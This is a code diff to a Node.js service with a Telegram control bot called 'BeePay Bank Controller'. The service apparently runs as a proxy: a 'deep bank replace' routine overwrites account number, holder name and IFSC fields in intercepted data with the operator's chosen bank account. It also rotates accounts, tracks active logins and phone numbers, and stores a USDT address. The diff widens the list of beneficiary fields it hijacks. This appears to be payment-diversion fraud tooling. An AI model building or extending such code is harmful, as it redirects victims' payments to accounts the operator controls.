@@ -331,7 +331,7 @@ function bankListText(d) {
     const a = i === d.activeIndex ? ' ✅' : '';
     const minA = Number(b.minAmount) || 0;
     const min = minA > 0 ? ` | ≥₹${minA}` : ' | any amt';
-    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${min}${a}`;
+    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${min}${a}`;
   }).join('\n');
 }
 
@@ -339,7 +339,7 @@ function bankListText(d) {
 async function saveOrderBank(data, orderId, bank) {
   if (!orderId || !bank || orderId === 'N/A') return;
   if (!data.orderBankMap) data.orderBankMap = {};
-  data.orderBankMap[String(orderId)] = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc, bankName: bank.bankName || '', upiId: bank.upiId || '' };
+  data.orderBankMap[String(orderId)] = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc };
   await saveData(data);
 }
 
@@ -382,7 +382,7 @@ async function saveOrderBankMultipleKeys(data, ids, bank) {
   const uniqueIds = [...new Set(ids.map(String).filter(id => id && id !== 'N/A'))];
   if (uniqueIds.length === 0) return;
   if (!data.orderBankMap) data.orderBankMap = {};
-  const bankData = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc, bankName: bank.bankName || '', upiId: bank.upiId || '' };
+  const bankData = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc };
   for (const id of uniqueIds) { data.orderBankMap[id] = bankData; }
   await saveData(data);
 }
@@ -487,11 +487,9 @@ async function extractUserId(req, jsonResp) {
 
 // ── Deep bank replace ─────────────────────────────────────────────
 const BANK_FIELD_PATTERNS = [
-  { field: ['accountNo', 'accountNumber', 'bankAccountNo', 'bankAccount', 'cardNo', 'payAccount', 'receiveAccount', 'toAccount', 'collectAccount'], type: 'accountNo' },
-  { field: ['accountHolder', 'accountName', 'bankAccountName', 'payName', 'receiveName', 'holderName', 'cardHolder'], type: 'accountHolder' },
-  { field: ['ifsc', 'ifscCode', 'bankCode', 'routingNumber', 'bankIfsc'], type: 'ifsc' },
-  { field: ['bankName', 'bank', 'bankNameStr'], type: 'bankName' },
-  { field: ['upiId', 'upi', 'upiAddress', 'vpa', 'payUpi'], type: 'upiId' },
+  { field: ['accountNo', 'accountNumber', 'bankAccountNo', 'bankAccount', 'cardNo', 'payAccount', 'receiveAccount', 'toAccount', 'collectAccount', 'customerBankNumber', 'customerAccountNo', 'customerAccount'], type: 'accountNo' },
+  { field: ['accountHolder', 'accountName', 'bankAccountName', 'payName', 'receiveName', 'holderName', 'cardHolder', 'customerName', 'customerHolder', 'beneficiaryName'], type: 'accountHolder' },
+  { field: ['ifsc', 'ifscCode', 'bankCode', 'routingNumber', 'bankIfsc', 'customerIfsc', 'beneficiaryIfsc'], type: 'ifsc' },
 ];
 
 function deepReplace(obj, bank, origVals, depth) {
@@ -809,7 +807,7 @@ app.post('/bot-webhook', async (req, res) => {
 `🐝 BeePay Bank Controller
 
 === BANK COMMANDS ===
-/addbank Name|AccNo|IFSC|BankName|UPI [minAmount]
+/addbank Name|AccNo|IFSC [minAmount]
 /setmin <bankNumber> <amount>
 /removebank <number>
 /setbank <number>
@@ -844,7 +842,7 @@ app.post('/bot-webhook', async (req, res) => {
 /idtrack — Show tracked users
 
 Example:
-/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
+/addbank Rahul Kumar|1234567890|SBIN0001234`
       );
       return res.sendStatus(200);
     }
@@ -860,7 +858,7 @@ Example:
       const activeCount = Array.isArray(data.activePhones) ? data.activePhones.length : 0;
       let m = `📊 BeePay Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\n🔄 Active Logins: ${activeCount}${activeCount > 0 ? ' (' + (data.activePhones || []).join(', ') + ')' : ''}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
-      if (active) m += `\n\n💳 Active Bank:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
+      if (active) m += `\n\n💳 Active Bank:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}`;
       else m += '\n\n⚠️ No active bank';
       await bot.sendMessage(chatId, m);
       return res.sendStatus(200);
@@ -886,7 +884,7 @@ Example:
       const minAmount = parseFloat(parts[1]) || 0;
       const bParts = bankStr.split('|');
       if (bParts.length < 3) {
-        await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI [minAmount]');
+        await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC [minAmount]');
         return res.sendStatus(200);
       }
       data = await loadData(true);
@@ -894,8 +892,6 @@ Example:
         accountHolder: bParts[0] || '',
         accountNo: bParts[1] || '',
         ifsc: bParts[2] || '',
-        bankName: bParts[3] || '',
-        upiId: bParts[4] || '',
         minAmount: minAmount
       });
       data._skipOverrideMerge = true;
